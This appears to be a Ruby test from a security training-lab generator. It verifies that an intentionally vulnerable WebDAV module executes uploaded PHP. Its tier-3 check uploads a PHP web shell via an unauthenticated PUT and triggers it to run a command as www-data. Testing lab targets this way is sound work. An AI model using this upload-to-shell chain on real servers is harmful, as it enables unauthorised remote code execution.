require 'shellwords'
require_relative '../../../../../lib/post_provision_test'

# Proves the PHP execution half of the WebDAV-upload-to-shell chain: a .php file
# placed in the writable collection is executed by mod_php, not served as text.
#
# This enabler reads no facts of its own (mod_php is global; the collection's
# port and path belong to apache_webdav_upload), so the test discovers the
# collection directory, its URL path and the serving Apache port from the running
# target at test time.
class WebdavFileUploadPhpTest < PostProvisionTest
  def initialize
    self.module_name = 'webdav_file_upload_php'
    self.module_path = get_module_path(__FILE__)
    super
  end

  # {dir:, path:, port:} for the writable WebDAV collection, or nil if not found.
  def discover_webdav
    dir = run_command("find /var/www/webdav -mindepth 1 -maxdepth 1 -type d -user www-data 2>/dev/null | head -1")[:stdout].to_s.strip
    return nil if dir.empty?
    conf = run_command("grep -lE '/var/www/webdav' /etc/apache2/sites-enabled/*.conf /etc/apache2/sites-available/*.conf 2>/dev/null | head -1")[:stdout].to_s.strip
    port = run_command("grep -hoE '<VirtualHost[^>]*:[0-9]+' #{Shellwords.escape(conf)} 2>/dev/null | grep -oE '[0-9]+' | head -1")[:stdout].to_s.strip
    return nil if port.empty?
    { dir: dir, path: File.basename(dir), port: port.to_i }
  end

  def test_module
    super

    tier(1) do
      test_local_command('libapache2-mod-php installed',
                         'dpkg -l "libapache2-mod-php*" 2>/dev/null | grep -E "^ii" || true',
                         'libapache2-mod-php')
      test_local_command('mod_php enabled in Apache',
                         'apache2ctl -M 2>/dev/null', 'php')
    end

    wd = discover_webdav

    tier(2) do
      if wd.nil?
        fail_check('locate WebDAV collection',
                   'no www-data-owned directory under /var/www/webdav, or no vhost port found', tier: 2)
      else
        # A non-executable .php dropped into the collection must be executed, not
        # served as source. If PHP runs, 6*7 is evaluated to 42; if it is served
        # as text the body contains the literal "6*7" and never "SECGENPHP_42".
        probe = "secgen_php_probe_#{rand(100000)}.php"
        payload = '<?php echo "SECGENPHP_".(6*7); ?>'
        run_command("printf '%s' #{Shellwords.escape(payload)} > #{Shellwords.escape(wd[:dir])}/#{probe} && chmod 644 #{Shellwords.escape(wd[:dir])}/#{probe}")
        test_http("/#{wd[:path]}/#{probe}", match: 'SECGENPHP_42', port: wd[:port],
                  label: 'uploaded .php is executed by mod_php (not served as source)', tier: 2)
      end
    end

    # Tier 3: an unauthenticated attacker PUTs a PHP web shell into the collection
    # and runs a command through it. Proof is a sentinel the command writes on the
    # target. apache2.service runs with PrivateTmp=true, so the sentinel must go
    # in a shared location (/dev/shm) to be read back over the guest agent.
    tier(3) do
      resolved = resolve_attacker('PHP web shell RCE', nil, nil, 3)
      next unless resolved
      attacker, _attacker_ip, rhost = resolved
      if wd.nil?
        fail_check('PHP web shell RCE', 'could not locate the WebDAV collection on the target', tier: 3)
        next
      end

      sentinel_path, scmd = build_sentinel(dir: '/dev/shm')
      shell = "secgen_shell_#{rand(100000)}.php"
      # Inline web shell: running it executes the sentinel command as www-data.
      shell_body = "<?php system('#{scmd}'); ?>"

      put = http_from_attacker("/#{wd[:path]}/#{shell}", attacker: attacker, rhost: rhost,
                               rport: wd[:port], method: 'PUT', data: shell_body)
      unless [200, 201, 204].include?(put[:status].to_i)
        fail_check('upload PHP web shell (unauthenticated PUT)',
                   "PUT returned HTTP #{put[:status]} (#{put[:error]})", tier: 3)
        next
      end

      # Trigger it, then read the sentinel back over the target's own guest agent.
      http_from_attacker("/#{wd[:path]}/#{shell}", attacker: attacker, rhost: rhost,
                         rport: wd[:port], method: 'GET')
      body = read_sentinel(sentinel_path)
      if sentinel_pwned?(body)
        pass_check('PHP web shell RCE as www-data',
                   "Uploaded #{shell} by unauth PUT and executed a command#{privilege_note(body)}.", tier: 3)
      else
        fail_check('PHP web shell RCE as www-data',
                   'PUT accepted but the web shell did not execute a command (no sentinel).', tier: 3)
      end
    end
  end
end

WebdavFileUploadPhpTest.new.run
